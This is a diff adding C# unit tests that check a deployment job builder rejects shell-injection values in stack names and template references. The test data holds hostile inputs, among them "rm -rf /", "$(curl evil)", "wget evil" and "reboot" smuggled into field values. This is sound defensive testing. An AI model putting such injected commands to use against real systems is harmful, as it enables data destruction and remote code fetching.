@@ -87,4 +87,34 @@ public sealed class BuildJobTests
         var ex = Assert.Throws<ArgumentException>(() => GetWorkflowJobEndpoint.BuildJob(row, Backend));
         Assert.Contains("too/few/parts", ex.Message, StringComparison.Ordinal);
     }
+
+    // OWASP A03: a project/stack name carrying a shell quote-breakout must never reach the runner script.
+    [Theory]
+    [InlineData("p'; rm -rf / #")]
+    [InlineData("p$(curl evil)")]
+    [InlineData("p`whoami`")]
+    [InlineData("p && reboot")]
+    public void StackInjectionAttemptIsRejected(string malicious)
+    {
+        var row = new DeploymentRow
+        {
+            Org = "o", Project = "p", Stack = malicious, Operation = "update",
+            TemplateRef = "private/o/t/1.0.0",
+        };
+
+        var ex = Assert.Throws<ArgumentException>(() => GetWorkflowJobEndpoint.BuildJob(row, Backend));
+        Assert.Contains(malicious, ex.Message, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public void TemplateRefSegmentInjectionAttemptIsRejected()
+    {
+        // The name segment "t';wget evil" carries a quote + space → rejected before any script is built.
+        var row = new DeploymentRow
+        {
+            Org = "o", Project = "p", Stack = "s", Operation = "update",
+            TemplateRef = "private/o/t';wget evil/1.0.0",
+        };
+        Assert.Throws<ArgumentException>(() => GetWorkflowJobEndpoint.BuildJob(row, Backend));
+    }
 }
